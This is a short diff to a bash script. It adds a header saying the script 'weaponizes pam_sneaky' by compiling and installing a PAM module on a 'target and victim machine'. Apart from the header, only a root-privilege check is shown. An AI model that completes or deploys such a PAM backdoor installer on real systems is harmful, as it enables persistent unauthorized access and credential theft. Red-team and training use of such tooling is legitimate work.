@@ -1,4 +1,11 @@
 #!/bin/bash
+# Author: John Hammond
+# Date: Friday, March 27th, 2020
+# 
+# This script weaponizes pam_sneaky to compile the module and
+# put it in place for common PAM configurations.
+# DO NOT RUN THIS ON YOUR OWN MACHINE.
+# Only run this code on the target and victim machine.
 
 # Verify you are running as root
 if [ $UID -ne 0 ]; then
